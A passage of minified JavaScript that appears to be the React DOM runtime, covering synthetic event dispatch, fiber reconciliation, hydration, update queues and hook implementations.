y(g,v+"enter",p,n,c),y.target=w,y.relatedTarget=x,b=y),x=b,h&&p)t:{for(y=h,g=p,v=0,w=y;w;w=Ri(w))v++;for(w=0,b=g;b;b=Ri(b))w++;for(;0<v-w;)y=Ri(y),v--;for(;0<w-v;)g=Ri(g),w--;for(;v--;){if(y===g||g!==null&&y===g.alternate)break t;y=Ri(y),g=Ri(g)}y=null}else y=null;h!==null&&My(d,f,h,y,!1),p!==null&&x!==null&&My(d,x,p,y,!0)}}e:{if(f=u?Hi(u):window,h=f.nodeName&&f.nodeName.toLowerCase(),h==="select"||h==="input"&&f.type==="file")var k=iN;else if(vy(f))if(uw)k=lN;else{k=oN;var E=sN}else(h=f.nodeName)&&h.toLowerCase()==="input"&&(f.type==="checkbox"||f.type==="radio")&&(k=aN);if(k&&(k=k(t,u))){lw(d,k,n,c);break e}E&&E(t,f,u),t==="focusout"&&(E=f._wrapperState)&&E.controlled&&f.type==="number"&&Lf(f,"number",f.value)}switch(E=u?Hi(u):window,t){case"focusin":(vy(E)||E.contentEditable==="true")&&(_i=E,Kf=u,yo=null);break;case"focusout":yo=Kf=_i=null;break;case"mousedown":qf=!0;break;case"contextmenu":case"mouseup":case"dragend":qf=!1,Cy(d,n,c);break;case"selectionchange":if(dN)break;case"keydown":case"keyup":Cy(d,n,c)}var M;if($p)e:{switch(t){case"compositionstart":var C="onCompositionStart";break e;case"compositionend":C="onCompositionEnd";break e;case"compositionupdate":C="onCompositionUpdate";break e}C=void 0}else zi?ow(t,n)&&(C="onCompositionEnd"):t==="keydown"&&n.keyCode===229&&(C="onCompositionStart");C&&(sw&&n.locale!=="ko"&&(zi||C!=="onCompositionStart"?C==="onCompositionEnd"&&zi&&(M=iw()):(dr=c,Vp="value"in dr?dr.value:dr.textContent,zi=!0)),E=tu(u,C),0<E.length&&(C=new my(C,t,null,n,c),d.push({event:C,listeners:E}),M?C.data=M:(M=aw(n),M!==null&&(C.data=M)))),(M=ZM?eN(t,n):tN(t,n))&&(u=tu(u,"onBeforeInput"),0<u.length&&(c=new my("onBeforeInput","beforeinput",null,n,c),d.push({event:c,listeners:u}),c.data=M))}vw(d,e)})}function Ko(t,e,n){return{instance:t,listener:e,currentTarget:n}}function tu(t,e){for(var n=e+"Capture",r=[];t!==null;){var i=t,s=i.stateNode;i.tag===5&&s!==null&&(i=s,s=Vo(t,n),s!=null&&r.unshift(Ko(t,s,i)),s=Vo(t,e),s!=null&&r.push(Ko(t,s,i))),t=t.return}return r}function Ri(t){if(t===null)return null;do t=t.return;while(t&&t.tag!==5);return t||null}function My(t,e,n,r,i){for(var s=e._reactName,o=[];n!==null&&n!==r;){var a=n,l=a.alternate,u=a.stateNode;if(l!==null&&l===r)break;a.tag===5&&u!==null&&(a=u,i?(l=Vo(n,s),l!=null&&o.unshift(Ko(n,l,a))):i||(l=Vo(n,s),l!=null&&o.push(Ko(n,l,a)))),n=n.return}o.length!==0&&t.push({event:e,listeners:o})}var mN=/\r\n?/g,gN=/\u0000|\uFFFD/g;function Ny(t){return(typeof t=="string"?t:""+t).replace(mN,`
`).replace(gN,"")}function Za(t,e,n){if(e=Ny(e),Ny(t)!==e&&n)throw Error(R(425))}function nu(){}var Gf=null,Jf=null;function Yf(t,e){return t==="textarea"||t==="noscript"||typeof e.children=="string"||typeof e.children=="number"||typeof e.dangerouslySetInnerHTML=="object"&&e.dangerouslySetInnerHTML!==null&&e.dangerouslySetInnerHTML.__html!=null}var Qf=typeof setTimeout=="function"?setTimeout:void 0,yN=typeof clearTimeout=="function"?clearTimeout:void 0,Ay=typeof Promise=="function"?Promise:void 0,xN=typeof queueMicrotask=="function"?queueMicrotask:typeof Ay<"u"?function(t){return Ay.resolve(null).then(t).catch(vN)}:Qf;function vN(t){setTimeout(function(){throw t})}function kd(t,e){var n=e,r=0;do{var i=n.nextSibling;if(t.removeChild(n),i&&i.nodeType===8)if(n=i.data,n==="/$"){if(r===0){t.removeChild(i),$o(e);return}r--}else n!=="$"&&n!=="$?"&&n!=="$!"||r++;n=i}while(n);$o(e)}function vr(t){for(;t!=null;t=t.nextSibling){var e=t.nodeType;if(e===1||e===3)break;if(e===8){if(e=t.data,e==="$"||e==="$!"||e==="$?")break;if(e==="/$")return null}}return t}function Py(t){t=t.previousSibling;for(var e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="$"||n==="$!"||n==="$?"){if(e===0)return t;e--}else n==="/$"&&e++}t=t.previousSibling}return null}var Os=Math.random().toString(36).slice(2),gn="__reactFiber$"+Os,qo="__reactProps$"+Os,$n="__reactContainer$"+Os,Xf="__reactEvents$"+Os,wN="__reactListeners$"+Os,SN="__reactHandles$"+Os;function Gr(t){var e=t[gn];if(e)return e;for(var n=t.parentNode;n;){if(e=n[$n]||n[gn]){if(n=e.alternate,e.child!==null||n!==null&&n.child!==null)for(t=Py(t);t!==null;){if(n=t[gn])return n;t=Py(t)}return e}t=n,n=t.parentNode}return null}function Ca(t){return t=t[gn]||t[$n],!t||t.tag!==5&&t.tag!==6&&t.tag!==13&&t.tag!==3?null:t}function Hi(t){if(t.tag===5||t.tag===6)return t.stateNode;throw Error(R(33))}function wc(t){return t[qo]||null}var Zf=[],Ui=-1;function jr(t){return{current:t}}function ie(t){0>Ui||(t.current=Zf[Ui],Zf[Ui]=null,Ui--)}function te(t,e){Ui++,Zf[Ui]=t.current,t.current=e}var Pr={},nt=jr(Pr),yt=jr(!1),pi=Pr;function ps(t,e){var n=t.type.contextTypes;if(!n)return Pr;var r=t.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===e)return r.__reactInternalMemoizedMaskedChildContext;var i={},s;for(s in n)i[s]=e[s];return r&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=e,t.__reactInternalMemoizedMaskedChildContext=i),i}function xt(t){return t=t.childContextTypes,t!=null}function ru(){ie(yt),ie(nt)}function Ry(t,e,n){if(nt.current!==Pr)throw Error(R(168));te(nt,e),te(yt,n)}function Sw(t,e,n){var r=t.stateNode;if(e=e.childContextTypes,typeof r.getChildContext!="function")return n;r=r.getChildContext();for(var i in r)if(!(i in e))throw Error(R(108,sM(t)||"Unknown",i));return he({},n,r)}function iu(t){return t=(t=t.stateNode)&&t.__reactInternalMemoizedMergedChildContext||Pr,pi=nt.current,te(nt,t),te(yt,yt.current),!0}function Oy(t,e,n){var r=t.stateNode;if(!r)throw Error(R(169));n?(t=Sw(t,e,pi),r.__reactInternalMemoizedMergedChildContext=t,ie(yt),ie(nt),te(nt,t)):ie(yt),te(yt,n)}var Ln=null,Sc=!1,bd=!1;function kw(t){Ln===null?Ln=[t]:Ln.push(t)}function kN(t){Sc=!0,kw(t)}function Fr(){if(!bd&&Ln!==null){bd=!0;var t=0,e=Z;try{var n=Ln;for(Z=1;t<n.length;t++){var r=n[t];do r=r(!0);while(r!==null)}Ln=null,Sc=!1}catch(i){throw Ln!==null&&(Ln=Ln.slice(t+1)),q1(Ip,Fr),i}finally{Z=e,bd=!1}}return null}var Wi=[],Ki=0,su=null,ou=0,Bt=[],Vt=0,mi=null,In=1,jn="";function Ur(t,e){Wi[Ki++]=ou,Wi[Ki++]=su,su=t,ou=e}function bw(t,e,n){Bt[Vt++]=In,Bt[Vt++]=jn,Bt[Vt++]=mi,mi=t;var r=In;t=jn;var i=32-nn(r)-1;r&=~(1<<i),n+=1;var s=32-nn(e)+i;if(30<s){var o=i-i%5;s=(r&(1<<o)-1).toString(32),r>>=o,i-=o,In=1<<32-nn(e)+i|n<<i|r,jn=s+t}else In=1<<s|n<<i|r,jn=t}function Up(t){t.return!==null&&(Ur(t,1),bw(t,1,0))}function Wp(t){for(;t===su;)su=Wi[--Ki],Wi[Ki]=null,ou=Wi[--Ki],Wi[Ki]=null;for(;t===mi;)mi=Bt[--Vt],Bt[Vt]=null,jn=Bt[--Vt],Bt[Vt]=null,In=Bt[--Vt],Bt[Vt]=null}var Nt=null,Mt=null,se=!1,Zt=null;function Cw(t,e){var n=$t(5,null,null,0);n.elementType="DELETED",n.stateNode=e,n.return=t,e=t.deletions,e===null?(t.deletions=[n],t.flags|=16):e.push(n)}function Dy(t,e){switch(t.tag){case 5:var n=t.type;return e=e.nodeType!==1||n.toLowerCase()!==e.nodeName.toLowerCase()?null:e,e!==null?(t.stateNode=e,Nt=t,Mt=vr(e.firstChild),!0):!1;case 6:return e=t.pendingProps===""||e.nodeType!==3?null:e,e!==null?(t.stateNode=e,Nt=t,Mt=null,!0):!1;case 13:return e=e.nodeType!==8?null:e,e!==null?(n=mi!==null?{id:In,overflow:jn}:null,t.memoizedState={dehydrated:e,treeContext:n,retryLane:1073741824},n=$t(18,null,null,0),n.stateNode=e,n.return=t,t.child=n,Nt=t,Mt=null,!0):!1;default:return!1}}function eh(t){return(t.mode&1)!==0&&(t.flags&128)===0}function th(t){if(se){var e=Mt;if(e){var n=e;if(!Dy(t,e)){if(eh(t))throw Error(R(418));e=vr(n.nextSibling);var r=Nt;e&&Dy(t,e)?Cw(r,n):(t.flags=t.flags&-4097|2,se=!1,Nt=t)}}else{if(eh(t))throw Error(R(418));t.flags=t.flags&-4097|2,se=!1,Nt=t}}}function Ly(t){for(t=t.return;t!==null&&t.tag!==5&&t.tag!==3&&t.tag!==13;)t=t.return;Nt=t}function el(t){if(t!==Nt)return!1;if(!se)return Ly(t),se=!0,!1;var e;if((e=t.tag!==3)&&!(e=t.tag!==5)&&(e=t.type,e=e!=="head"&&e!=="body"&&!Yf(t.type,t.memoizedProps)),e&&(e=Mt)){if(eh(t))throw Ew(),Error(R(418));for(;e;)Cw(t,e),e=vr(e.nextSibling)}if(Ly(t),t.tag===13){if(t=t.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error(R(317));e:{for(t=t.nextSibling,e=0;t;){if(t.nodeType===8){var n=t.data;if(n==="/$"){if(e===0){Mt=vr(t.nextSibling);break e}e--}else n!=="$"&&n!=="$!"&&n!=="$?"||e++}t=t.nextSibling}Mt=null}}else Mt=Nt?vr(t.stateNode.nextSibling):null;return!0}function Ew(){for(var t=Mt;t;)t=vr(t.nextSibling)}function ms(){Mt=Nt=null,se=!1}function Kp(t){Zt===null?Zt=[t]:Zt.push(t)}var bN=Gn.ReactCurrentBatchConfig;function Js(t,e,n){if(t=n.ref,t!==null&&typeof t!="function"&&typeof t!="object"){if(n._owner){if(n=n._owner,n){if(n.tag!==1)throw Error(R(309));var r=n.stateNode}if(!r)throw Error(R(147,t));var i=r,s=""+t;return e!==null&&e.ref!==null&&typeof e.ref=="function"&&e.ref._stringRef===s?e.ref:(e=function(o){var a=i.refs;o===null?delete a[s]:a[s]=o},e._stringRef=s,e)}if(typeof t!="string")throw Error(R(284));if(!n._owner)throw Error(R(290,t))}return t}function tl(t,e){throw t=Object.prototype.toString.call(e),Error(R(31,t==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":t))}function Iy(t){var e=t._init;return e(t._payload)}function Tw(t){function e(g,v){if(t){var w=g.deletions;w===null?(g.deletions=[v],g.flags|=16):w.push(v)}}function n(g,v){if(!t)return null;for(;v!==null;)e(g,v),v=v.sibling;return null}function r(g,v){for(g=new Map;v!==null;)v.key!==null?g.set(v.key,v):g.set(v.index,v),v=v.sibling;return g}function i(g,v){return g=br(g,v),g.index=0,g.sibling=null,g}function s(g,v,w){return g.index=w,t?(w=g.alternate,w!==null?(w=w.index,w<v?(g.flags|=2,v):w):(g.flags|=2,v)):(g.flags|=1048576,v)}function o(g){return t&&g.alternate===null&&(g.flags|=2),g}function a(g,v,w,b){return v===null||v.tag!==6?(v=Pd(w,g.mode,b),v.return=g,v):(v=i(v,w),v.return=g,v)}function l(g,v,w,b){var k=w.type;return k===Vi?c(g,v,w.props.children,b,w.key):v!==null&&(v.elementType===k||typeof k=="object"&&k!==null&&k.$$typeof===nr&&Iy(k)===v.type)?(b=i(v,w.props),b.ref=Js(g,v,w),b.return=g,b):(b=Dl(w.type,w.key,w.props,null,g.mode,b),b.ref=Js(g,v,w),b.return=g,b)}function u(g,v,w,b){return v===null||v.tag!==4||v.stateNode.containerInfo!==w.containerInfo||v.stateNode.implementation!==w.implementation?(v=Rd(w,g.mode,b),v.return=g,v):(v=i(v,w.children||[]),v.return=g,v)}function c(g,v,w,b,k){return v===null||v.tag!==7?(v=si(w,g.mode,b,k),v.return=g,v):(v=i(v,w),v.return=g,v)}function d(g,v,w){if(typeof v=="string"&&v!==""||typeof v=="number")return v=Pd(""+v,g.mode,w),v.return=g,v;if(typeof v=="object"&&v!==null){switch(v.$$typeof){case Ua:return w=Dl(v.type,v.key,v.props,null,g.mode,w),w.ref=Js(g,null,v),w.return=g,w;case Bi:return v=Rd(v,g.mode,w),v.return=g,v;case nr:var b=v._init;return d(g,b(v._payload),w)}if(io(v)||Us(v))return v=si(v,g.mode,w,null),v.return=g,v;tl(g,v)}return null}function f(g,v,w,b){var k=v!==null?v.key:null;if(typeof w=="string"&&w!==""||typeof w=="number")return k!==null?null:a(g,v,""+w,b);if(typeof w=="object"&&w!==null){switch(w.$$typeof){case Ua:return w.key===k?l(g,v,w,b):null;case Bi:return w.key===k?u(g,v,w,b):null;case nr:return k=w._init,f(g,v,k(w._payload),b)}if(io(w)||Us(w))return k!==null?null:c(g,v,w,b,null);tl(g,w)}return null}function h(g,v,w,b,k){if(typeof b=="string"&&b!==""||typeof b=="number")return g=g.get(w)||null,a(v,g,""+b,k);if(typeof b=="object"&&b!==null){switch(b.$$typeof){case Ua:return g=g.get(b.key===null?w:b.key)||null,l(v,g,b,k);case Bi:return g=g.get(b.key===null?w:b.key)||null,u(v,g,b,k);case nr:var E=b._init;return h(g,v,w,E(b._payload),k)}if(io(b)||Us(b))return g=g.get(w)||null,c(v,g,b,k,null);tl(v,b)}return null}function p(g,v,w,b){for(var k=null,E=null,M=v,C=v=0,N=null;M!==null&&C<w.length;C++){M.index>C?(N=M,M=null):N=M.sibling;var O=f(g,M,w[C],b);if(O===null){M===null&&(M=N);break}t&&M&&O.alternate===null&&e(g,M),v=s(O,v,C),E===null?k=O:E.sibling=O,E=O,M=N}if(C===w.length)return n(g,M),se&&Ur(g,C),k;if(M===null){for(;C<w.length;C++)M=d(g,w[C],b),M!==null&&(v=s(M,v,C),E===null?k=M:E.sibling=M,E=M);return se&&Ur(g,C),k}for(M=r(g,M);C<w.length;C++)N=h(M,g,C,w[C],b),N!==null&&(t&&N.alternate!==null&&M.delete(N.key===null?C:N.key),v=s(N,v,C),E===null?k=N:E.sibling=N,E=N);return t&&M.forEach(function(H){return e(g,H)}),se&&Ur(g,C),k}function y(g,v,w,b){var k=Us(w);if(typeof k!="function")throw Error(R(150));if(w=k.call(w),w==null)throw Error(R(151));for(var E=k=null,M=v,C=v=0,N=null,O=w.next();M!==null&&!O.done;C++,O=w.next()){M.index>C?(N=M,M=null):N=M.sibling;var H=f(g,M,O.value,b);if(H===null){M===null&&(M=N);break}t&&M&&H.alternate===null&&e(g,M),v=s(H,v,C),E===null?k=H:E.sibling=H,E=H,M=N}if(O.done)return n(g,M),se&&Ur(g,C),k;if(M===null){for(;!O.done;C++,O=w.next())O=d(g,O.value,b),O!==null&&(v=s(O,v,C),E===null?k=O:E.sibling=O,E=O);return se&&Ur(g,C),k}for(M=r(g,M);!O.done;C++,O=w.next())O=h(M,g,C,O.value,b),O!==null&&(t&&O.alternate!==null&&M.delete(O.key===null?C:O.key),v=s(O,v,C),E===null?k=O:E.sibling=O,E=O);return t&&M.forEach(function(pe){return e(g,pe)}),se&&Ur(g,C),k}function x(g,v,w,b){if(typeof w=="object"&&w!==null&&w.type===Vi&&w.key===null&&(w=w.props.children),typeof w=="object"&&w!==null){switch(w.$$typeof){case Ua:e:{for(var k=w.key,E=v;E!==null;){if(E.key===k){if(k=w.type,k===Vi){if(E.tag===7){n(g,E.sibling),v=i(E,w.props.children),v.return=g,g=v;break e}}else if(E.elementType===k||typeof k=="object"&&k!==null&&k.$$typeof===nr&&Iy(k)===E.type){n(g,E.sibling),v=i(E,w.props),v.ref=Js(g,E,w),v.return=g,g=v;break e}n(g,E);break}else e(g,E);E=E.sibling}w.type===Vi?(v=si(w.props.children,g.mode,b,w.key),v.return=g,g=v):(b=Dl(w.type,w.key,w.props,null,g.mode,b),b.ref=Js(g,v,w),b.return=g,g=b)}return o(g);case Bi:e:{for(E=w.key;v!==null;){if(v.key===E)if(v.tag===4&&v.stateNode.containerInfo===w.containerInfo&&v.stateNode.implementation===w.implementation){n(g,v.sibling),v=i(v,w.children||[]),v.return=g,g=v;break e}else{n(g,v);break}else e(g,v);v=v.sibling}v=Rd(w,g.mode,b),v.return=g,g=v}return o(g);case nr:return E=w._init,x(g,v,E(w._payload),b)}if(io(w))return p(g,v,w,b);if(Us(w))return y(g,v,w,b);tl(g,w)}return typeof w=="string"&&w!==""||typeof w=="number"?(w=""+w,v!==null&&v.tag===6?(n(g,v.sibling),v=i(v,w),v.return=g,g=v):(n(g,v),v=Pd(w,g.mode,b),v.return=g,g=v),o(g)):n(g,v)}return x}var gs=Tw(!0),Mw=Tw(!1),au=jr(null),lu=null,qi=null,qp=null;function Gp(){qp=qi=lu=null}function Jp(t){var e=au.current;ie(au),t._currentValue=e}function nh(t,e,n){for(;t!==null;){var r=t.alternate;if((t.childLanes&e)!==e?(t.childLanes|=e,r!==null&&(r.childLanes|=e)):r!==null&&(r.childLanes&e)!==e&&(r.childLanes|=e),t===n)break;t=t.return}}function as(t,e){lu=t,qp=qi=null,t=t.dependencies,t!==null&&t.firstContext!==null&&(t.lanes&e&&(mt=!0),t.firstContext=null)}function qt(t){var e=t._currentValue;if(qp!==t)if(t={context:t,memoizedValue:e,next:null},qi===null){if(lu===null)throw Error(R(308));qi=t,lu.dependencies={lanes:0,firstContext:t}}else qi=qi.next=t;return e}var Jr=null;function Yp(t){Jr===null?Jr=[t]:Jr.push(t)}function Nw(t,e,n,r){var i=e.interleaved;return i===null?(n.next=n,Yp(e)):(n.next=i.next,i.next=n),e.interleaved=n,Hn(t,r)}function Hn(t,e){t.lanes|=e;var n=t.alternate;for(n!==null&&(n.lanes|=e),n=t,t=t.return;t!==null;)t.childLanes|=e,n=t.alternate,n!==null&&(n.childLanes|=e),n=t,t=t.return;return n.tag===3?n.stateNode:null}var rr=!1;function Qp(t){t.updateQueue={baseState:t.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function Aw(t,e){t=t.updateQueue,e.updateQueue===t&&(e.updateQueue={baseState:t.baseState,firstBaseUpdate:t.firstBaseUpdate,lastBaseUpdate:t.lastBaseUpdate,shared:t.shared,effects:t.effects})}function Bn(t,e){return{eventTime:t,lane:e,tag:0,payload:null,callback:null,next:null}}function wr(t,e,n){var r=t.updateQueue;if(r===null)return null;if(r=r.shared,Q&2){var i=r.pending;return i===null?e.next=e:(e.next=i.next,i.next=e),r.pending=e,Hn(t,n)}return i=r.interleaved,i===null?(e.next=e,Yp(r)):(e.next=i.next,i.next=e),r.interleaved=e,Hn(t,n)}function Ml(t,e,n){if(e=e.updateQueue,e!==null&&(e=e.shared,(n&4194240)!==0)){var r=e.lanes;r&=t.pendingLanes,n|=r,e.lanes=n,jp(t,n)}}function jy(t,e){var n=t.updateQueue,r=t.alternate;if(r!==null&&(r=r.updateQueue,n===r)){var i=null,s=null;if(n=n.firstBaseUpdate,n!==null){do{var o={eventTime:n.eventTime,lane:n.lane,tag:n.tag,payload:n.payload,callback:n.callback,next:null};s===null?i=s=o:s=s.next=o,n=n.next}while(n!==null);s===null?i=s=e:s=s.next=e}else i=s=e;n={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:s,shared:r.shared,effects:r.effects},t.updateQueue=n;return}t=n.lastBaseUpdate,t===null?n.firstBaseUpdate=e:t.next=e,n.lastBaseUpdate=e}function uu(t,e,n,r){var i=t.updateQueue;rr=!1;var s=i.firstBaseUpdate,o=i.lastBaseUpdate,a=i.shared.pending;if(a!==null){i.shared.pending=null;var l=a,u=l.next;l.next=null,o===null?s=u:o.next=u,o=l;var c=t.alternate;c!==null&&(c=c.updateQueue,a=c.lastBaseUpdate,a!==o&&(a===null?c.firstBaseUpdate=u:a.next=u,c.lastBaseUpdate=l))}if(s!==null){var d=i.baseState;o=0,c=u=l=null,a=s;do{var f=a.lane,h=a.eventTime;if((r&f)===f){c!==null&&(c=c.next={eventTime:h,lane:0,tag:a.tag,payload:a.payload,callback:a.callback,next:null});e:{var p=t,y=a;switch(f=e,h=n,y.tag){case 1:if(p=y.payload,typeof p=="function"){d=p.call(h,d,f);break e}d=p;break e;case 3:p.flags=p.flags&-65537|128;case 0:if(p=y.payload,f=typeof p=="function"?p.call(h,d,f):p,f==null)break e;d=he({},d,f);break e;case 2:rr=!0}}a.callback!==null&&a.lane!==0&&(t.flags|=64,f=i.effects,f===null?i.effects=[a]:f.push(a))}else h={eventTime:h,lane:f,tag:a.tag,payload:a.payload,callback:a.callback,next:null},c===null?(u=c=h,l=d):c=c.next=h,o|=f;if(a=a.next,a===null){if(a=i.shared.pending,a===null)break;f=a,a=f.next,f.next=null,i.lastBaseUpdate=f,i.shared.pending=null}}while(!0);if(c===null&&(l=d),i.baseState=l,i.firstBaseUpdate=u,i.lastBaseUpdate=c,e=i.shared.interleaved,e!==null){i=e;do o|=i.lane,i=i.next;while(i!==e)}else s===null&&(i.shared.lanes=0);yi|=o,t.lanes=o,t.memoizedState=d}}function Fy(t,e,n){if(t=e.effects,e.effects=null,t!==null)for(e=0;e<t.length;e++){var r=t[e],i=r.callback;if(i!==null){if(r.callback=null,r=n,typeof i!="function")throw Error(R(191,i));i.call(r)}}}var Ea={},xn=jr(Ea),Go=jr(Ea),Jo=jr(Ea);function Yr(t){if(t===Ea)throw Error(R(174));return t}function Xp(t,e){switch(te(Jo,e),te(Go,t),te(xn,Ea),t=e.nodeType,t){case 9:case 11:e=(e=e.documentElement)?e.namespaceURI:jf(null,"");break;default:t=t===8?e.parentNode:e,e=t.namespaceURI||null,t=t.tagName,e=jf(e,t)}ie(xn),te(xn,e)}function ys(){ie(xn),ie(Go),ie(Jo)}function Pw(t){Yr(Jo.current);var e=Yr(xn.current),n=jf(e,t.type);e!==n&&(te(Go,t),te(xn,n))}function Zp(t){Go.current===t&&(ie(xn),ie(Go))}var le=jr(0);function cu(t){for(var e=t;e!==null;){if(e.tag===13){var n=e.memoizedState;if(n!==null&&(n=n.dehydrated,n===null||n.data==="$?"||n.data==="$!"))return e}else if(e.tag===19&&e.memoizedProps.revealOrder!==void 0){if(e.flags&128)return e}else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return null;e=e.return}e.sibling.return=e.return,e=e.sibling}return null}var Cd=[];function em(){for(var t=0;t<Cd.length;t++)Cd[t]._workInProgressVersionPrimary=null;Cd.length=0}var Nl=Gn.ReactCurrentDispatcher,Ed=Gn.ReactCurrentBatchConfig,gi=0,de=null,Oe=null,Le=null,du=!1,xo=!1,Yo=0,CN=0;function Je(){throw Error(R(321))}function tm(t,e){if(e===null)return!1;for(var n=0;n<e.length&&n<t.length;n++)if(!on(t[n],e[n]))return!1;return!0}function nm(t,e,n,r,i,s){if(gi=s,de=e,e.memoizedState=null,e.updateQueue=null,e.lanes=0,Nl.current=t===null||t.memoizedState===null?NN:AN,t=n(r,i),xo){s=0;do{if(xo=!1,Yo=0,25<=s)throw Error(R(301));s+=1,Le=Oe=null,e.updateQueue=null,Nl.current=PN,t=n(r,i)}while(xo)}if(Nl.current=fu,e=Oe!==null&&Oe.next!==null,gi=0,Le=Oe=de=null,du=!1,e)throw Error(R(300));return t}function rm(){var t=Yo!==0;return Yo=0,t}function fn(){var t={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Le===null?de.memoizedState=Le=t:Le=Le.next=t,Le}function Gt(){if(Oe===null){var t=de.alternate;t=t!==null?t.memoizedState:null}else t=Oe.next;var e=Le===null?de.memoizedState:Le.next;if(e!==null)Le=e,Oe=t;else{if(t===null)throw Error(R(310));Oe=t,t={memoizedState:Oe.memoizedState,baseState:Oe.baseState,baseQueue:Oe.baseQueue,queue:Oe.queue,next:null},Le===null?de.memoizedState=Le=t:Le=Le.next=t}return Le}function Qo(t,e){return typeof e=="function"?e(t):e}function Td(t){var e=Gt(),n=e.queue;if(n===null)throw Error(R(311));n.lastRenderedReducer=t;var r=Oe,i=r.baseQueue,s=n.pending;if(s!==null){if(i!==null){var o=i.next;i.next=s.next,s.next=o}r.baseQueue=i=s,n.pending=null}if(i!==null){s=i.next,r=r.baseState;var a=o=null,l=null,u=s;do{var c=u.lane;if((gi&c)===c)l!==null&&(l=l.next={lane:0,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),r=u.hasEagerState?u.eagerState:t(r,u.action);else{var d={lane:c,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null};l===null?(a=l=d,o=r):l=l.next=d,de.lanes|=c,yi|=c}u=u.next}while(u!==null&&u!==s);l===null?o=r:l.next=a,on(r,e.memoizedState)||(mt=!0),e.memoizedState=r,e.baseState=o,e.baseQueue=l,n.lastRenderedState=r}if(t=n.interleaved,t!==null){i=t;do s=i.lane,de.lanes|=s,yi|=s,i=i.next;while(i!==t)}else i===null&&(n.lanes=0);return[e.memoizedState,n.dispatch]}function Md(t){var e=Gt(),n=e.queue;if(n===null)throw Error(R(311));n.lastRenderedReducer=t;var r=n.dispatch,i=n.pending,s=e.memoizedState;if(i!==null){n.pending=null;var o=i=i.next;do s=t(s,o.action),o=o.next;while(o!==i);on(s,e.memoizedState)||(mt=!0),e.memoizedState=s,e.baseQueue===null&&(e.baseState=s),n.lastRenderedState=s}return[s,r]}function Rw(){}function Ow(t,e){var n=de,r=Gt(),i=e(),s=!on(r.memoizedState,i);if(s&&(r.memoizedState=i,mt=!0),r=r.queue,im(Iw.bind(null,n,r,t),[t]),r.getSnapshot!==e||s||Le!==null&&Le.memoizedState.tag&1){if(n.flags|=2048,Xo(9,Lw.bind(null,n,r,i,e),void 0,null),je===null)throw Error(R(349));gi&30||Dw(n,e,i)}return i}function Dw(t,e,n){t.flags|=16384,t={getSnapshot:e,value:n},e=de.updateQueue,e===null?(e={lastEffect:null,stores:null},de.updateQueue=e,e.stores=[t]):(n=e.stores,n===null?e.stores=[t]:n.push(t))}function Lw(t,e,n,r){e.value=n,e.getSnapshot=r,jw(e)&&Fw(t)}function Iw(t,e,n){return n(function(){jw(e)&&Fw(t)})}function jw(t){var e=t.getSnapshot;t=t.value;try{var n=e();return!on(t,n)}catch{return!0}}function Fw(t){var e=Hn(t,1);e!==null&&rn(e,t,1,-1)}function By(t){var e=fn();return typeof t=="function"&&(t=t()),e.memoizedState=e.baseState=t,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Qo,lastRenderedState:t},e.queue=t,t=t.dispatch=MN.bind(null,de,t),[e.memoizedState,t]}function Xo(t,e,n,r){return t={tag:t,create:e,destroy:n,deps:r,next:null},e=de.updateQueue,e===null?(e={lastEffect:null,stores:null},de.updateQueue=e,e.lastEffect=t.next=t):(n=e.lastEffect,n===null?e.lastEffect=t.next=t:(r=n.next,n.next=t,t.next=r,e.lastEffect=t)),t}function Bw(){return Gt().memoizedState}function Al(t,e,n,r){var i=fn();de.flags|=t,i.memoizedState=Xo(1|e,n,void 0,r===void 0?null:r)}function kc(t,e,n,r){var i=Gt();r=r===void 0?null:r;var s=void 0;if(Oe!==null){var o=Oe.memoizedState;if(s=o.destroy,r!==null&&tm(r,o.deps)){i.memoizedState=Xo(e,n,s,r);return}}de.flags|=t,i.memoizedState=Xo(1|e,n,s,r)}function Vy(t,e){return Al(8390656,8,t,e)}function im(t,e){return kc(2048,8,t,e)}function Vw(t,e){return kc(4,2,t,e)}function zw(t,e){return kc(4,4,t,e)}function _w(t,e){if(typeof e=="function")return t=t(),e(t),function(){e(null)};if(e!=null)return t=t(),e.current=t,function(){e.current=null}}function $w(t,e,n){return n=n!=null?n.concat([t]):null,kc(4,4,_w.bind(null,e,t),n)}function sm(){}function Hw(t,e){var n=Gt();e=e===void 0?null:e;var r=n.memoizedState;return r!==null&&e!==null&&tm(e,r[1])?r[0]:(n.memoizedState=[t,e],t)}function Uw(t,e){var n=Gt();e=e===void 0?null:e;var r=n.memoizedState;return r!==null&&e!==null&&tm(e,r[1])?r[0]:(t=t(),n.memoizedState=[t,e],t)}function Ww(t,e,n){return gi&21?(on(n,e)||(n=Y1(),de.lanes|=n,yi|=n,t.baseState=!0),e):(t.baseState&&(t.baseState=!1,mt=!0),t.memoizedState=n)}function EN(t,e){var n=Z;Z=n!==0&&4>n?n:4,t(!0);var r=Ed.transition;Ed.transition={};try{t(!1),e()}finally{Z=n,Ed.transition=r}}function Kw(){return Gt().memoizedState}function TN(t,e,n){var r=kr(t);if(n={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null},qw(t))Gw(e,n);else if(n=Nw(t,e,n,r),n!==null){var i=at();rn(n,t,r,i),Jw(n,e,r)}}function MN(t,e,n){var r=kr(t),i={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null};if(qw(t))Gw(e,i);else{var s=t.alternate;if(t.lanes===0&&(s===null||s.lanes===0)&&(s=e.lastRenderedReducer,s!==null))try{var o=e.lastRenderedState,a=s(o,n);if(i.hasEagerState=!0,i.eagerState=a,on(a,o)){var l=e.interleaved;l===null?(i.next=i,Yp(e)):(i.next=l.next,l.next=i),e.interleaved=i;return}}catch{}finally{}n=Nw(t,e,i,r),n!==null&&(i=at(),rn(n,t,r,i),Jw(n,e,r))}}function qw(t){var e=t.alternate;return t===de||e!==null&&e===de}function Gw(t,e){xo=du=!0;var 